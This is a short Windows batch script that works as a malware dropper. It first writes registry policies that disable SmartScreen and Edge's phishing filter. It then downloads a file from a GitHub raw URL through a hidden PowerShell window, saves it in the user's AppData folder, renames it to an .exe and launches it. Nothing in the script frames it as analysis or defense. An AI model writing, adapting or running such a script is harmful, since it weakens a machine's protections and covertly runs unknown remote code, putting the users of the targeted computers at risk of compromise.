@echo off
setlocal

:: Disable SmartScreen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f

:: Your existing code to download and rename the file
set "url=https://github.com/rspvn/a/raw/main/test"
set "folder=%USERPROFILE%\AppData\Roaming\test"
set "file=test"
set "exefile=test.exe"

if not exist "%folder%" (
    mkdir "%folder%"
)

:: Check if file exists
if exist "%folder%\%exefile%" (
    start "" "%folder%\%exefile%"
    exit /b
) else (
    powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"
    
    if exist "%folder%\%file%" (
        :: Rename the file to add .exe extension
        ren "%folder%\%file%" "%exefile%"
        
        :: Start the renamed .exe file
        start "" "%folder%\%exefile%"
    ) else (
        echo Download failed.
    )
    
    :: Close CMD window after 5 seconds
    timeout /t 5 /nobreak >nul
    exit /b
)

endlocal
